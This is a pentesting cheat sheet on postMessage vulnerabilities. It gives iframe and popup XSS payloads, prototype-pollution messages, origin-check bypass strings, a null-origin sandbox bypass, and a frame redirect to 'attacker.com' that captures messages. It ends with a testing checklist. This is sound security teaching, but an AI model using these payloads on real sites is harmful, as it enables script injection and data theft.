---
tags:
  - medium
  - client-side
---

# PostMessage Vulnerabilities

Exploit weak origin validation in `postMessage` handlers to inject malicious data or steal secrets.

## TL;DR

```javascript
// Attack: Send malicious postMessage to vulnerable listener
targetWindow.postMessage('<img src=x onerror=alert(1)>', '*')

// Prototype pollution via postMessage
window.frames[0].postMessage('{"__proto__":{"isAdmin":true}}', '*')
```

## Detection

### Find Listeners

```javascript
// DevTools console
getEventListeners(window).message

// Search JS for handlers
// window.addEventListener("message", ...)
```

**Tools:** Posta browser extension, postMessage-tracker

### Analyze Handler

**Vulnerable patterns:**
```javascript
// Missing origin check
window.addEventListener("message", (e) => {
  document.body.innerHTML = e.data;  // XSS!
});

// Weak origin check
window.addEventListener("message", (e) => {
  if (e.origin.indexOf("trusted.com") !== -1) {  // Bypassable!
    processData(e.data);
  }
});
```

## Exploitation

### Basic XSS via postMessage

**Iframe attack:**
```html
<iframe id="target" src="https://vulnerable.com/page"></iframe>
<script>
  document.getElementById('target').onload = function() {
    this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
  };
</script>
```

**Popup attack:**
```html
<script>
  var win = window.open('https://vulnerable.com/page');
  setTimeout(() => {
    win.postMessage('malicious_payload', '*');
  }, 2000);
</script>
```

### Prototype Pollution via postMessage

```html
<iframe id="victim" src="https://target.com/app"></iframe>
<script>
  setTimeout(() => {
    document.getElementById('victim').contentWindow.postMessage(
      '{"__proto__":{"isAdmin":true}}', '*'
    );
  }, 2000);
</script>
```

### Origin Bypass Techniques

**indexOf() bypass:**
```javascript
// if (e.origin.indexOf("trusted.com") !== -1)
// Bypass: https://trusted.com.attacker.com
```

**search() regex bypass:**
```javascript
// if (e.origin.search("www.trusted.com") !== -1)
// Bypass: www.sTRusted.com (dot is wildcard in regex)
```

**match() bypass:**
```javascript
// if (e.origin.match(/trusted\.com/))
// Bypass: attacker-trusted.com
```

### Sandboxed iframe Origin Bypass

```html
<iframe sandbox="allow-scripts allow-popups" srcdoc="
  <script>
    var popup = window.open('https://vulnerable.com');
    setTimeout(() => {
      // Both origins are 'null'
      popup.postMessage('payload', '*');
    }, 2000);
  </script>
"></iframe>
```

If handler checks `e.origin === window.origin`, both are `null` → bypass!

### Steal postMessage via Location Change

```html
<html>
<iframe src="https://docs.google.com/document/ID"></iframe>
<script>
  setTimeout(() => {
    // Change nested iframe to attacker page
    window.frames[0].frames[0].location = "https://attacker.com/steal.html";
  }, 6000);
</script>
</html>
```

Messages sent with wildcard `*` go to attacker page.

## Bypasses

### X-Frame-Options Bypass

If can't iframe, use popup:
```javascript
var win = window.open('https://target.com/vulnerable');
setTimeout(() => win.postMessage('payload', '*'), 2000);
```

## Real Examples

| Attack | Impact |
|--------|--------|
| Missing origin check | XSS |
| Prototype pollution + XSS | Account takeover |
| Origin stored → script loaded | Supply chain XSS |
| OAuth code exfiltration | Account takeover |

## Tools

| Tool | Purpose |
|------|---------|
| **Posta** | Browser extension - intercept postMessages |
| **DOM Invader** | Automated postMessage testing |

**DevTools Snippet:**
```javascript
// Log all postMessages
window.addEventListener('message', e => {
  console.log('Received:', {origin: e.origin, data: e.data});
});
```

## Testing Checklist

- [ ] Find all message listeners
- [ ] Check for origin validation
- [ ] Test indexOf/search/match bypasses
- [ ] Send XSS payloads via postMessage
- [ ] Test prototype pollution payloads
- [ ] Check for sensitive data in outgoing messages
- [ ] Test with sandboxed iframe (null origin)
- [ ] Check if page can be iframed/popup opened
